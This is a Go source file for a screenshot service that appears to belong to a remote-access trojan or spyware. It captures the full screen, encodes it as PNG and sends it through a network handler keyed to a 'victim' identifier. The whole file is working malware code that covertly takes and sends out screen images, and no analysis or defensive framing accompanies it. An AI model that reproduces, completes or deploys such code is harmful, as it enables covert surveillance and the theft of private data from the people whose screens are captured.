package services

import (
	"bytes"
	"fmt"
	"github.com/vova616/screenshot"
	"image/png"
	"main/network"
	"sync"
	"time"
)

type ScreenshotService struct {
	Mutex   *sync.Mutex
	image   []byte
	errcode network.ErrorCode
}

func (s *ScreenshotService) Start() {
	img, err := screenshot.CaptureScreen()
	s.Mutex.Lock()
	if err != nil {
		fmt.Println(err)
		s.errcode = Error
	} else {

		buf := new(bytes.Buffer)
		err := png.Encode(buf, img)
		if err != nil {
			fmt.Println(err)
		}
		send := buf.Bytes()

		s.image = send
		s.errcode = Ok
	}
	s.Mutex.Unlock()
}

func (s *ScreenshotService) Communicate(victim string) {
	for s.errcode == Pending {
		time.Sleep(2 * time.Second)
		s.Mutex.Lock()
		if s.errcode == Ok {
			_, err := network.HandleImageRequest(s.image, "screenshot", victim)
			if err != nil {
				fmt.Println("Error sending the request")
				s.errcode = Error
			} else {
				s.errcode = Pending
				s.Mutex.Unlock()
				break
			}
		}
		s.Mutex.Unlock()
	}
}
